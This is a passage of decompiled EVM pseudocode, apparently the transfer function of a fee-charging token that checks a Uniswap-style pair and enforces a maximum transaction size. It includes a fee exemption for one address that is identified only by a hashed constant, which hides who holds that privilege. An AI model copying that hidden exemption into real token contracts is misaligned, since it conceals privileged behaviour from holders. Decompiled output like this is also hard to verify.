                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor16[address(msg.sender)]:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).factory() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7169 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7187 = mem[_7169]
                        require mem[_7169] == mem[_7169 + 12 len 20]
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).WETH() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7235 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7269 = mem[_7235]
                        require mem[_7235] == mem[_7235 + 12 len 20]
                        mem[mem[64] + 4] = this.address
                        mem[mem[64] + 36] = address(_7269)
                        require ext_code.size(address(_7187))
                        staticcall address(_7187).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(_7269)
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7439 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7511 = mem[_7439]
                        require mem[_7439] == mem[_7439 + 12 len 20]
                        if mem[_7439 + 12 len 20] != msg.sender:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7883 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7883 + 32 len mem[_7883]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if msg.sender == address(_7511):
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7911 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7911 + 32 len mem[_7911]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor16[address(arg1)]:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
            else:
                mem[32] = 13
                require balanceOf[address(msg.sender)] >= arg2
                require ext_code.size(address(stor20.field_8))
                staticcall address(stor20.field_8).factory() with:
                        gas gas_remaining wei
                mem[148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                require ext_code.size(address(stor20.field_8))
                staticcall address(stor20.field_8).WETH() with:
                        gas gas_remaining wei
                mem[ceil32(return_data.size) + 148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                mem[(2 * ceil32(return_data.size)) + 152] = this.address
                mem[(2 * ceil32(return_data.size)) + 184] = address(ext_call.return_data[0])
                require ext_code.size(address(ext_call.return_data[0]))
                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(ext_call.return_data[0])
                mem[(2 * ceil32(return_data.size)) + 148] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                mem[64] = (4 * ceil32(return_data.size)) + 148
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                if ext_call.return_data[12 len 20] != msg.sender:
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if arg1 == ext_call.return_data[12 len 20]:
                        if stor16[address(msg.sender)]:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if arg1 == this.address:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor18:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if not arg2:
                                require arg2 <= _maxTxAmount
                                require ext_code.size(address(stor20.field_8))
                                staticcall address(stor20.field_8).factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(address(stor20.field_8))
                                staticcall address(stor20.field_8).WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2,
                                                  mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                stor19.length++
                                stor19[stor19.length].field_0 = arg1
                                stor19[stor19.length].field_256 = arg2
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2,
                                              mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                            else:
                                if arg2 and _fee > -1 / arg2:
                                    revert with 'NH{q', 17
                                if not arg2:
                                    revert with 'NH{q', 18
                                if arg2 * _fee / arg2 != _fee:
                                    revert with 0, 'SafeMath: multiplication overflow'
                                require arg2 <= _maxTxAmount
                                require ext_code.size(address(stor20.field_8))
                                staticcall address(stor20.field_8).factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
